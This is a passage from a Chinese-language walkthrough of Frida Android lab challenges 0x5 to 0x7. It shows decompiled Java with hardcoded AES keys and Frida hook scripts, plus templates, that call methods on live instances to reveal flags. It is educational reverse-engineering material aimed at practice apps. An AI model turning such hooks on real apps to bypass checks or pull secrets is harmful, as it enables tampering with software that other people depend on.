class="hljs-comment">// 调用该实例中的方法</span><br><br>&#125;)<br></code></pre></td></tr></table></figure><h1 id="Frida-0x5"><a href="#Frida-0x5" class="headerlink" title="Frida 0x5"></a>Frida 0x5</h1><h2 id="运行-3"><a href="#运行-3" class="headerlink" title="运行"></a>运行</h2><p>也是一个什么都没有的静态页面</p><p><img src="https://img.dkdun.cn/v1/2025/12/b144d16e1471e3bf.png"></p><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x5;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-comment">/* loaded from: classes3.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    TextView t1;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-built_in">this</span>.t1 = (TextView) findViewById(R.id.textview);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">flag</span><span class="hljs-params">(<span class="hljs-type">int</span> code)</span> &#123;<br>        <span class="hljs-keyword">if</span> (code == <span class="hljs-number">1337</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">secretKeySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(<span class="hljs-string">&quot;WILLIWOMNKESAWEL&quot;</span>.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>);<br>                <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>                <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">iv</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>]);<br>                cipher.init(<span class="hljs-number">2</span>, secretKeySpec, iv);<br>                <span class="hljs-type">byte</span>[] decodedEnc = Base64.getDecoder().decode(<span class="hljs-string">&quot;2Y2YINP9PtJCS/7oq189VzFynmpG8swQDmH4IC9wKAY=&quot;</span>);<br>                <span class="hljs-type">byte</span>[] decryptedBytes = cipher.doFinal(decodedEnc);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">decryptedText</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decryptedBytes);<br>                <span class="hljs-built_in">this</span>.t1.setText(decryptedText);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="MainActivity-类-2"><a href="#MainActivity-类-2" class="headerlink" title="MainActivity 类"></a>MainActivity 类</h3><p>有一个 <code>flag</code> 方法，与上一题类似，但这一题是  <code>flag</code> 方法在 <code>MainActivity</code> 类里，并且 <code>MainActivity</code> 已经在应用程序启动的时候实例化了，使用 <code>Java.use</code> 获取 <code>MainActivity</code> 类并调用 <code>new()</code> 创建实例会导致错误，所以可以获取 <code>MainActivity</code> 的实例，然后调用就可以了</p><p><img src="https://img.dkdun.cn/v1/2025/12/365f04385e2b91f9.png"></p><h2 id="Hook-3"><a href="#Hook-3" class="headerlink" title="Hook"></a>Hook</h2><h3 id="在现有的实例上调用方法"><a href="#在现有的实例上调用方法" class="headerlink" title="在现有的实例上调用方法"></a>在现有的实例上调用方法</h3><p>demo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook5</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;com.ad2001.frida0x5.MainActivity&quot;</span>,&#123;<br><span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">instance</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance);<br>instance.<span class="hljs-title function_">flag</span>(<span class="hljs-number">1337</span>)<br>&#125;,<br><span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;endhook&quot;</span>)<br>&#125;<br>&#125;)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title function_">hook5</span>();<br>&#125;)<br>&#125;<br><br><span class="hljs-built_in">setTimeout</span>(main,<span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p>demo 中使用了一些 API 和 回调函数：</p><ul><li><code>Java.choose</code>：遍历 Java 堆，枚举指定类的活动实例。</li><li><code>onMatch()</code> 回调函数：每当找到一个实例时触发定义的操作。</li><li><code>onComplete()</code> 回调函数：执行一些清理工作，或者根据请求的结果更新。</li></ul><p><img src="https://img.dkdun.cn/v1/2025/12/7130cf6add20a96a.png"></p><h2 id="Conclusion-3"><a href="#Conclusion-3" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>大概流程：调用 <code>MainActivity</code> 中的非静态方法 -&gt; 通过 <code>Java.choose</code> 搜索实例对象 -&gt; 通过 <code>onMatch()</code> 回调进行 hook 逻辑 -&gt; <code>onComplete()</code> 进行结束处理</p><p>Frida 在现有实例上调用方法的模板：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">performNow</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&#x27;&lt;Package&gt;.&lt;class_Name&gt;&#x27;</span>, &#123;<br><span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">instance</span>) &#123;<br><span class="hljs-comment">// 匹配到类实例时进行的操作</span><br>&#125;,<br><span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-comment">// 完成操作后的回调函数</span><br>&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>这里的 <code>Java.performNow</code> 是 Frida 中的一个函数，用于在 Java 运行时环境中执行代码</p><h1 id="Frida-0x6"><a href="#Frida-0x6" class="headerlink" title="Frida 0x6"></a>Frida 0x6</h1><h2 id="运行-4"><a href="#运行-4" class="headerlink" title="运行"></a>运行</h2><p>还是一样的静态页面</p><p><img src="https://img.dkdun.cn/v1/2025/12/d1326b6de17553b3.png"></p><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>MainActivity 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x6;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> java.security.InvalidKeyException;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javax.crypto.BadPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.IllegalBlockSizeException;<br><span class="hljs-keyword">import</span> javax.crypto.NoSuchPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-comment">/* loaded from: classes3.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    TextView t1;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-built_in">this</span>.t1 = (TextView) findViewById(R.id.textview);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">get_flag</span><span class="hljs-params">(Checker A)</span> <span class="hljs-keyword">throws</span> NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-number">1234</span> == A.num1 &amp;&amp; <span class="hljs-number">4321</span> == A.num2) &#123;<br>            <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>            <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">secretKeySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(<span class="hljs-string">&quot;MySecureKey12345&quot;</span>.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>);<br>            cipher.init(<span class="hljs-number">2</span>, secretKeySpec);<br>            <span class="hljs-type">byte</span>[] decryptedBytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;QQzMj/JNaTblEHnIzgJAQkvWJV2oK9G2/UmrCs85fog=&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">decrypted</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cipher.doFinal(decryptedBytes));<br>            <span class="hljs-built_in">this</span>.t1.setText(decrypted);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Checker 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x6;<br><br><span class="hljs-comment">/* loaded from: classes3.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Checker</span> &#123;<br>    <span class="hljs-type">int</span> num1;<br>    <span class="hljs-type">int</span> num2;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="MainActivity-类-3"><a href="#MainActivity-类-3" class="headerlink" title="MainActivity 类"></a>MainActivity 类</h3><p><code>MainActivity</code> 类的 <code>get_flag()</code> 方法传入一个 <code>Checker</code> 实例，当 <code>num1==1234</code>且 <code>num2==4321</code> 时获取 flag，这个 <code>get_flag()</code> 方法也并没有被调用</p><p><img src="https://img.dkdun.cn/v1/2025/12/85032a4bbeb78354.png"></p><h3 id="Checker"><a href="#Checker" class="headerlink" title="Checker"></a>Checker</h3><p>两个变量 <code>num1</code> 和 <code>num2</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/20b50e74531882b5.png"></p><p>所以解决方法就是创建 <code>Checker</code> 类的实例，给两个变量设置值，获取 <code>MainActivity</code> 实例然后将实例作为参数调用 <code>get_flag</code> 方法</p><h2 id="Hook-4"><a href="#Hook-4" class="headerlink" title="Hook"></a>Hook</h2><p>创建一个符合条件的实例，传递给  <code>get_flag</code> 方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook6</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;com.ad2001.frida0x6.MainActivity&quot;</span>,&#123;<br><span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">instance</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance);<br><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Checker</span> =<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x6.Checker&quot;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">CheckerObj</span>=<span class="hljs-title class_">Checker</span>.$new();<br>            <br>            <span class="hljs-comment">//实例化对象</span><br><span class="hljs-title class_">CheckerObj</span>.<span class="hljs-property">num1</span>.<span class="hljs-property">value</span>=<span class="hljs-number">1234</span>;<br><span class="hljs-title class_">CheckerObj</span>.<span class="hljs-property">num2</span>.<span class="hljs-property">value</span>=<span class="hljs-number">4321</span>;<br>            <br>instance.<span class="hljs-title function_">get_flag</span>(<span class="hljs-title class_">CheckerObj</span>);<span class="hljs-comment">//调用 get_flag 方法</span><br>&#125;,<br><span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;endhook&quot;</span>);<br>&#125;<br>&#125;)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title function_">hook6</span>();<br>&#125;)<br>&#125;<br><br><span class="hljs-built_in">setTimeout</span>(main,<span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/0da7e5811ca7f6aa.png"></p><h2 id="Conclusion-4"><a href="#Conclusion-4" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>对 <code>MainActivity</code> 中非静态方法且参数为非静态变量进行对象参数调用</p><p>Frida 使用对象参数调用方法的模板：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">performNow</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&#x27;&lt;Package&gt;.&lt;class_Name&gt;&#x27;</span>, &#123;<br>    <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">instance</span>) &#123;<br>      <span class="hljs-keyword">var</span> &lt;class_reference&gt; = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;&lt;package_name&gt;.&lt;class&gt;&quot;</span>);<br>      <span class="hljs-keyword">var</span> &lt;class_instance&gt; = &lt;class_reference&gt;.$new(); <span class="hljs-comment">// 创建类的实例</span><br>        <br>      &lt;class_reference&gt;.&lt;variable&gt;.<span class="hljs-property">value</span> = &lt;value&gt;;<span class="hljs-comment">// 实例化对象</span><br>      <br>      instance.&lt;method&gt;(class_instance); <span class="hljs-comment">// 调用方法</span><br>    &#125;,<br>    <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;<br>    <span class="hljs-comment">// 完成操作后的回调函数</span><br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><h1 id="Frida-0x7"><a href="#Frida-0x7" class="headerlink" title="Frida 0x7"></a>Frida 0x7</h1><h2 id="运行-5"><a href="#运行-5" class="headerlink" title="运行"></a>运行</h2><p>依旧是一样的静态界面</p><p><img src="https://img.dkdun.cn/v1/2025/12/245631b863645523.png"></p><h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p>MainActivity 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x7;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> java.security.InvalidKeyException;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javax.crypto.BadPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.IllegalBlockSizeException;<br><span class="hljs-keyword">import</span> javax.crypto.NoSuchPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-comment">/* loaded from: classes3.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    TextView t1;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-built_in">this</span>.t1 = (TextView) findViewById(R.id.textview);<br>        <span class="hljs-type">Checker</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Checker</span>(<span class="hljs-number">123</span>, <span class="hljs-number">321</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            flag(ch);<br>        &#125; <span class="hljs-keyword">catch</span> (InvalidKeyException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchAlgorithmException e2) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e2);<br>        &#125; <span class="hljs-keyword">catch</span> (BadPaddingException e3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e3);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalBlockSizeException e4) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e4);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchPaddingException e5) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e5);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">flag</span><span class="hljs-params">(Checker A)</span> <span class="hljs-keyword">throws</span> NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException &#123;<br>        <span class="hljs-keyword">if</span> (A.num1 &gt; <span class="hljs-number">512</span> &amp;&amp; <span class="hljs-number">512</span> &lt; A.num2) &#123;<br>            <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>            <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">secretKeySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(<span class="hljs-string">&quot;MySecureKey12345&quot;</span>.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>);<br>            cipher.init(<span class="hljs-number">2</span>, secretKeySpec);<br>            <span class="hljs-type">byte</span>[] decryptedBytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;cL/bBqDmfO0IXXJCVFwYLeHp1k3mQr+SP6rlQGUPZTY=&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">decrypted</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cipher.doFinal(decryptedBytes));<br>            <span class="hljs-built_in">this</span>.t1.setText(decrypted);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Checker 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x7;<br><br><span class="hljs-comment">/* loaded from: classes3.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Checker</span> &#123;<br>    <span class="hljs-type">int</span> num1;<br>    <span class="hljs-type">int</span> num2;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: package-private */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Checker</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>        <span class="hljs-built_in">this</span>.num1 = a;<br>        <span class="hljs-built_in">this</span>.num2 = b;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="MainActivity-类-4"><a href="#MainActivity-类-4" class="headerlink" title="MainActivity 类"></a>MainActivity 类</h3><p>先 <code>Checker ch = new Checker(123, 321);</code> 创建了一个 <code>Checker</code> 实例，然后 <code>Checker</code> 类的对象调用 <code>flag</code> 方法传入该对象，之后对 <code>num1</code> 和 <code>num2</code> 的两个值分别进行判断，两个参数必须都大于 512</p><p><img src="https://img.dkdun.cn/v1/2025/12/56ea579e5977c8bc.png"></p><h3 id="Checker-类-1"><a href="#Checker-类-1" class="headerlink" title="Checker 类"></a>Checker 类</h3><p>两个变量 <code>num1</code> 和 <code>num2</code>，通过构造函数去赋值</p><p><img src="https://img.dkdun.cn/v1/2025/12/53ce8a3da16591e3.png"></p><h2 id="Hook-5"><a href="#Hook-5" class="headerlink" title="Hook"></a>Hook</h2><h3 id="通过构造函数传参"><a href="#通过构造函数传参" class="headerlink" title="通过构造函数传参"></a>通过构造函数传参</h3><p>跟 0x6 一样的步骤，不过要通过构造函数传参</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook7</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;com.ad2001.frida0x7.MainActivity&quot;</span>,&#123;<br><span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">instance</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance);<br><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Checker</span> =<span class="hljs-title class_">Java</span>.<span class="hljs-title 